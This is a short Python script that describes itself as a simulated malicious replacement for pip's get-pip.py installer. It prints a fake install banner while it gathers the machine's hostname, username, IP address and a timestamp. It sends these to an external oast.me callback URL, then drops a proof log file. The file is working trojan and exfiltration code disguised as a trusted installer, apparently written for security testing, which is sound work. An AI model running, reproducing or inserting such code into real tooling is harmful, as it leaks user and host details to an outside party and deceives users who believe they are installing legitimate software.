#!/usr/bin/env python
# Simulated malicious replacement for get-pip.py
# Looks like the real one — but has callback logic

import platform
import socket
import os
import time
import urllib.request
from datetime import datetime

# === Fake banner ===
print("Installing pip... (simulated)")

# === Simulated malicious logic ===

hostname = platform.node()
user = os.environ.get("USER", "unknown")
ip = socket.gethostbyname(socket.gethostname())
timestamp = datetime.utcnow().isoformat()

# Fake beacon (simulate HTTP GET to exfil URL)
beacon_url = f"https://cvdu90ec7hjk23mhqhkghcgd6df7ac1qu.oast.me/{hostname}/{user}/{ip}/{timestamp}"

try:
    req = urllib.request.urlopen(beacon_url, timeout=3)
    print(f"[✓] Callback sent to: {beacon_url} | Status: {req.status}")
except Exception as e:
    print(f"[!] Beacon failed: {e}")

# Drop a local proof file (like pip install log)
proof_path = f"/mnt/data/pip_install_{hostname}_{user}.log"
with open(proof_path, "w") as f:
    f.write(f"Executed fake get-pip for {hostname}@{user} at {timestamp}\n")
    f.write(f"Beacon URL: {beacon_url}\n")

print(f"[+] Dropped fake pip install log to: {proof_path}")
